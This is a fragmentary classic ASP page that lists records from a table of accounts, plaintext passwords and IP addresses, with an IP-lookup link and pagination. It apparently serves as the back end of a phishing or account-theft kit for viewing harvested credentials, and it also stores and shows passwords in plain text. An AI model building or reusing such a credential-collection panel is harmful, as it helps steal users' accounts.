...
sql="select id,user,pass,ip,data from main order by id desc"
...
<table width="777" height="51" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#B6E6FB" >
  ...
  <tr>
    <td><table width="100%" height="51" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF" >
  ...
  if rs.recordcount=0 then
	  ...
	  do while i<rs.pagesize and not rs.eof
		  %>
        <tr>
          <td width="19%" height="25" align="center" valign="middle"><div align="left" class="STYLE5"><span class="STYLE5">帐号：<%=rs("user")%></span></div></td>
          <td width="18%" align="center" valign="middle"><div align="left" class="STYLE5">密码：<%=rs("pass")%></div></td>
        </tr>
        <tr>
          <td height="25" align="center" valign="middle"><div align="left" class="STYLE5">
            <div align="left" class="STYLE5">IP地址：<a href="http://ip138.com/ips.asp?ip=<%=rs("ip")%>" target="_blank"><%=rs("ip")%></a> </div>
          </div></td>
  ...
  %>        
        <tr>
          <td colspan="2"><div align="right"><span class="STYLE5">记录总数： <%=rs.recordcount%> 条 当前页：<%=PageNo%>/<%=rs.pagecount%> 页大小：<%=rs.pagesize%> <a href="?PageNo=1">首页</a> <a href="?PageNo=<%=PageNo-1%>">上页</a> <a href="?PageNo=<%=PageNo+1%>">下页</a> <a href="?PageNo=<%=rs.pagecount%>">末页</a></span>
